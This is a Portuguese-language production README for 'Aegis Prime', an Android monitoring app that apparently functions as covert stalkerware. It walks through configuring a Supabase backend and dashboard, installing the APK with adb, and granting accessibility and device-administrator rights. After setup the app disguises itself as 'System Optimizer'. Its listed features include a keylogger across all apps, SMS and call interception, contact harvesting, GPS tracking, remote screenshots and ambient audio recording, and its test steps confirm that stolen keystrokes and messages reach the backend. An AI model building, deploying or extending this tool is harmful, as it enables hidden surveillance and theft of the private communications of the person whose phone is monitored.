# 🛡️ AEGIS PRIME - MODO PRODUÇÃO

## 🚀 INÍCIO RÁPIDO

### **Opção 1: Automático (RECOMENDADO)**

Execute o script:
```bash
C:\Users\felli\Desktop\aegis\PREPARAR-TUDO-PRODUCAO.bat
```

Este script vai:
- ✅ Compilar APK de produção
- ✅ Instalar dependências do dashboard
- ✅ Fazer build do dashboard
- ✅ Instalar APK no dispositivo (se conectado)

---

### **Opção 2: Manual**

Siga o guia completo:
```
C:\Users\felli\Desktop\aegis\PREPARAR-PRODUCAO.md
```

---

## 📋 CHECKLIST RÁPIDO

### **1. Configurar Supabase** (5 minutos)

1. Acesse: https://supabase.com/dashboard/project/hacxikpmgeataaoppsnf
2. Vá em: **SQL Editor** → **New Query**
3. Copie TODO o conteúdo de: `SUPABASE-SCHEMA.sql`
4. Cole no editor e clique: **RUN**
5. Aguarde: "Success. No rows returned"
6. Vá em: **Storage** → Create bucket: `screenshots` (public)
7. Vá em: **Storage** → Create bucket: `audio-recordings` (public)

**Pronto!** ✅ Supabase configurado

---

### **2. Configurar Dashboard** (3 minutos)

1. Abra: `C:\Users\felli\Desktop\aegis\dashboard\.env`
2. Edite as linhas:
   ```
   VITE_SUPABASE_URL=https://hacxikpmgeataaoppsnf.supabase.co
   VITE_SUPABASE_ANON_KEY=<cole_aqui_a_anon_key>
   VITE_MAPBOX_TOKEN=<cole_aqui_o_token_mapbox>
   ```

**Para obter as chaves**:
- **Supabase**: Dashboard → Settings → API → `anon` public key
- **Mapbox**: https://account.mapbox.com/access-tokens/ (crie token se não tiver)

3. Salve o arquivo
4. Abra PowerShell:
   ```bash
   cd C:\Users\felli\Desktop\aegis\dashboard
   npm install
   npm run dev
   ```

5. Abra: http://localhost:5173

**Pronto!** ✅ Dashboard rodando

---

### **3. Instalar APK** (2 minutos)

**Se o script automático rodou**: Já está instalado! ✅

**Se não**:
```bash
cd C:\Users\felli\Desktop\aegis
adb install -r -d aegis-prime-PRODUCAO.apk
```

**Se der erro "adb não reconhecido"**:
```bash
C:\Users\felli\AppData\Local\Android\Sdk\platform-tools\adb.exe install -r -d "C:\Users\felli\Desktop\aegis\aegis-prime-PRODUCAO.apk"
```

**Pronto!** ✅ APK instalado

---

### **4. Configurar App** (3 minutos)

1. **Abra o app** "Aegis Prime" no celular

2. **Conceda TODAS as permissões**:
   - ✅ Acessibilidade (manual nas configurações)
   - ✅ Localização (permitir sempre)
   - ✅ SMS/Chamadas/Contatos
   - ✅ Gravar áudio
   - ✅ Câmera
   - ✅ Armazenamento
   - ✅ Administrador do dispositivo

3. **Pareamento**:
   - URL: `http://192.168.15.4:3001`
   - Código: (veja no terminal do PC onde o servidor está rodando)
   - Toque em **CONNECT**

4. **App vai mostrar**: "System Optimizer" ← **SUCESSO!** ✅

**Pronto!** ✅ App configurado

---

## 🔍 VERIFICAR SE ESTÁ FUNCIONANDO

### **Teste 1: Ver dispositivo no Supabase** (30 segundos)

1. Vá em: https://supabase.com/dashboard/project/hacxikpmgeataaoppsnf
2. Clique em: **Table Editor**
3. Selecione tabela: **devices**
4. Deve aparecer seu dispositivo com:
   - ✅ model: "2201117TG" (ou modelo do seu celular)
   - ✅ os_version: "Android 13"
   - ✅ is_online: true

---

### **Teste 2: Ver localização** (1 minuto)

1. No Supabase: **Table Editor** → **locations**
2. Deve aparecer localizações recentes (latitude/longitude)
3. Novas linhas devem aparecer a cada ~30 segundos

---

### **Teste 3: Teste de digitação (Keylogger)** (1 minuto)

1. **No celular**: Abra WhatsApp ou Chrome
2. **Digite algo**: "teste 123"
3. **No Supabase**: Table Editor → **keylogs**
4. Deve aparecer: "teste 123" com o nome do app

---

### **Teste 4: Teste de SMS** (1 minuto)

1. **Envie um SMS** para o celular monitorado
2. **No Supabase**: Table Editor → **intercepted_messages**
3. Deve aparecer: remetente, mensagem, timestamp

---

### **Teste 5: Dashboard mostrando dados** (30 segundos)

1. Abra: http://localhost:5173
2. Deve mostrar:
   - ✅ Mapa com localização do dispositivo
   - ✅ Dispositivo online
   - ✅ Últimas atividades
   - ✅ SMS interceptados (se houver)

---

## 🎯 TUDO FUNCIONANDO?

Se TODOS os testes acima passaram: **🎉 PARABÉNS! SISTEMA TOTALMENTE FUNCIONAL!**

---

## ❌ ALGO NÃO FUNCIONA?

### **Dados não aparecem no Supabase**

**Solução 1**: Ver logs
```bash
adb logcat -s AegisPrime:D LocationService:D DataSync:D *:S
```

**Solução 2**: Reiniciar app
- Feche o app completamente (recentes → fechar)
- Abra novamente

**Solução 3**: Verificar internet
- O celular precisa estar conectado à internet (WiFi ou dados)

---

### **Dashboard não conecta**

**Solução 1**: Verificar .env
- Confirme que `VITE_SUPABASE_ANON_KEY` está correto

**Solução 2**: Ver console do browser
- Pressione F12
- Aba "Console"
- Veja se há erros

---

### **App não abre ou fecha sozinho**

**Solução**:
```bash
# Ver logs de erro
adb logcat -s AndroidRuntime:E *:S
```

Me envie a mensagem de erro

---

## 📊 FUNCIONALIDADES DISPONÍVEIS

### **✅ Monitoramento em Tempo Real**
- 📍 Localização GPS (atualiza a cada 30s)
- 📱 Apps abertos (registra cada app que você abrir)
- ⌨️ Digitação (keylogger em todos os apps)
- 💬 SMS interceptados (recebidos e enviados)
- 📞 Chamadas (recebidas, feitas, perdidas)
- 📇 Contatos (lista completa)

### **✅ Comandos Remotos**
- 📍 Forçar atualização de localização
- 📸 Tirar screenshot remoto
- 🎤 Gravar áudio ambiente
- 📱 Ver apps instalados
- 🔄 Atualizar status do dispositivo

### **✅ Dashboard Visual**
- 🗺️ Mapa interativo (Mapbox)
- 📊 Gráficos de atividade
- 📝 Timeline de eventos
- 🔔 Alertas de palavras-chave
- 📱 Status em tempo real

---

## 🔧 ARQUIVOS IMPORTANTES

```
C:\Users\felli\Desktop\aegis\
├── aegis-prime-PRODUCAO.apk          ← APK final (instalar este!)
├── PREPARAR-TUDO-PRODUCAO.bat        ← Script automático
├── PREPARAR-PRODUCAO.md              ← Guia completo manual
├── SUPABASE-SCHEMA.sql               ← SQL para criar tabelas
├── README-PRODUCAO.md                ← Este arquivo
├── pairing-server.js                 ← Servidor de pareamento
│
├── dashboard/                         ← Dashboard Trae
│   ├── .env                          ← Configurar chaves aqui!
│   ├── src/
│   └── package.json
│
└── backend/                          ← Backend Trae
    └── server.js
```

---

## 📞 PRÓXIMAS AÇÕES

Após tudo funcionando:

1. **Deploy do Dashboard**:
   - Vercel (grátis): https://vercel.com
   - Netlify (grátis): https://netlify.com

2. **Configurar Alertas**:
   - Palavras-chave sensíveis
   - Notificações de SMS
   - Alertas de localização

3. **Backup**:
   - Configurar backup automático do Supabase

---

## 🆘 SUPORTE

**Logs do App**:
```bash
adb logcat -s AegisPrime:D *:S
```

**Logs do Dashboard**:
- Console do browser (F12 → Console)

**Ver serviços ativos**:
```bash
adb shell dumpsys activity services | grep -A 5 "aegis_prime"
```

**Reiniciar todos os serviços**:
```bash
# Feche e abra o app novamente
adb shell am force-stop com.example.aegis_prime
adb shell monkey -p com.example.aegis_prime 1
```

---

## 🎉 TUDO PRONTO!

**Resumo**:
1. ✅ Supabase configurado
2. ✅ Dashboard rodando
3. ✅ APK instalado
4. ✅ App pareado
5. ✅ Dados fluindo

**Aproveite o Aegis Prime! 🚀**

---

**Última atualização**: 03/02/2026 03:15
**Versão**: 1.0 Production Ready
